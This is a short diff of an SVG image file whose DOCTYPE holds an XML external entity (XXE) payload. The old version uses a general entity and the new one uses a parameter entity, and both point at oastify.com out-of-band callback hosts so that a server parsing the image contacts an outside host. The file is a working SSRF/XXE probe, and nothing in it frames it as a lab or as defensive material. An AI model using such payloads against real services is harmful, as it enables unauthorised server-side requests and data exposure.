@@ -1,7 +1,8 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE svg [
-  <!ENTITY xxe SYSTEM "https://au8qstpvduuplef6akqt868io9u1iuaiz.oastify.com/xxe-ssrf-proof">
+  <!ENTITY % xxe SYSTEM "https://wddcbf8hwgdb40yst69frsr47vdn1gw4l.oastify.com">
+  %xxe;
 ]>
 <svg xmlns="http://www.w3.org/2000/svg" width="800" height="500">
-  <text x="10" y="50" font-size="14">&xxe;</text>
+  <text x="10" y="50" font-size="14">SVG LOADED</text>
 </svg>
